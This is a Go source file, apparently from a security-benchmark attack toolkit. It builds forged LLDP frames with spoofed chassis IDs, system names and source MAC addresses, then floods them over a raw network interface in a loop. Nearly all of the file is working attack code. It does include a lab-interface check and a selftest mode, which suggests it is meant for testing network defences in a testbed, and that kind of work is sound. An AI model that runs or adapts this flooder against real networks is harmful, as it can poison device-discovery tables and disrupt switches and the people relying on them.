package main

import (
	"encoding/binary"
	"fmt"
	"os"

	"github.com/rohanpunj/iolbox/tools/secbench-attacks-go/internal/attackcommon"
)

const (
	lldpEtherType = 0x88cc
	lldpMinFrame  = 60
)

func appendLLDPTLV(payload []byte, typ uint8, value []byte) ([]byte, error) {
	if typ > 0x7f {
		return nil, fmt.Errorf("LLDP TLV type %#02x is too large", typ)
	}
	if len(value) > 0x1ff {
		return nil, fmt.Errorf("LLDP TLV type %#02x value is too long: %d bytes", typ, len(value))
	}
	tlv := make([]byte, 2+len(value))
	binary.BigEndian.PutUint16(tlv[:2], uint16(typ)<<9|uint16(len(value)))
	copy(tlv[2:], value)
	return append(payload, tlv...), nil
}

func buildLLDP(chassisID, systemName string, n int) ([]byte, error) {
	payload := make([]byte, 0, 64)
	var err error
	chassisValue := append([]byte{0x07}, []byte(fmt.Sprintf("%s-%d", chassisID, n))...)
	payload, err = appendLLDPTLV(payload, 0x01, chassisValue)
	if err != nil {
		return nil, err
	}
	payload, err = appendLLDPTLV(payload, 0x02, append([]byte{0x05}, []byte("eth1")...))
	if err != nil {
		return nil, err
	}
	ttl := make([]byte, 2)
	binary.BigEndian.PutUint16(ttl, 120)
	payload, err = appendLLDPTLV(payload, 0x03, ttl)
	if err != nil {
		return nil, err
	}
	payload, err = appendLLDPTLV(payload, 0x05, []byte(systemName))
	if err != nil {
		return nil, err
	}
	payload, err = appendLLDPTLV(payload, 0x00, nil)
	if err != nil {
		return nil, err
	}

	frame := make([]byte, 14, 14+len(payload))
	copy(frame[0:6], []byte{0x01, 0x80, 0xc2, 0x00, 0x00, 0x0e})
	copy(frame[6:12], attackcommon.ForgedMAC())
	binary.BigEndian.PutUint16(frame[12:14], lldpEtherType)
	frame = append(frame, payload...)
	if len(frame) < lldpMinFrame {
		frame = append(frame, make([]byte, lldpMinFrame-len(frame))...)
	}
	return frame, nil
}

func run() int {
	fs, common := attackcommon.BaseParser("Flood forged LLDP TLVs")
	chassisID := fs.String("chassis_id", "fake-chassis", "")
	systemName := fs.String("system_name", "fake-switch", "")
	if err := fs.Parse(os.Args[1:]); err != nil {
		return 2
	}
	if err := attackcommon.EnforceLabIface(common.Iface); err != nil {
		attackcommon.Status("FATAL", err.Error())
		return 2
	}

	frame, err := buildLLDP(*chassisID, *systemName, 0)
	if err != nil {
		attackcommon.Status("FATAL", fmt.Sprintf("LLDP packet build failed: %v", err))
		return 1
	}
	if common.Selftest {
		attackcommon.SelftestOK("lldp_flood", fmt.Sprintf("LLDP frame len=%d", len(frame)))
		return 0
	}

	sender, err := attackcommon.OpenRawSender(common.Iface)
	if err != nil {
		attackcommon.Status("FATAL", err.Error())
		return 1
	}
	defer sender.Close()

	_, err = attackcommon.RunLoop(common.Count, common.Interval, func(n int) error {
		frame, err := buildLLDP(*chassisID, *systemName, n)
		if err != nil {
			return err
		}
		if err := sender.Send(frame); err != nil {
			return fmt.Errorf("send LLDP frame: %w", err)
		}
		attackcommon.Status("SENT", fmt.Sprintf("LLDP #%d chassis-id=%s-%d system-name='%s'", n+1, *chassisID, n, *systemName))
		return nil
	})
	if err != nil {
		attackcommon.Status("FATAL", err.Error())
		return 1
	}
	return 0
}

func main() {
	os.Exit(run())
}
